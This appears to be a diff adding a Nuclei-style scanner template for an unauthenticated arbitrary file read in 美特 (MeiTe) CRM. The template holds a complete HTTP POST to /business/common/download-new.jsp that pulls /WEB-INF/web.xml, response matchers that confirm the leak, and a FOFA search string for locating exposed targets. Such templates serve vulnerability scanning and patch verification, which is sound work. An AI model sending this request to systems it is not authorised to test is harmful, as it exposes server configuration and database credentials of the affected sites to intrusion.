@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"listener>","servlet","<?xml")
+          name: 任意文件读取
+          type: dsl
+      raw:
+        - |
+          POST /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+          Connection: close
+          Content-Type: application/x-www-form-urlencoded
+id: MeiTe-CRM-download-new-File-Reading
+info:
+    author: HuanXiong
+    description: |-
+        fofa: body="/common/scripts/basic.js"
+        美特 CRM download-new.jsp 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 美特 CRM download-new.jsp 任意文件读取
+    reference:
+        - null
+    severity: medium
+    tags:
+        - File Reading
+        - Servlet
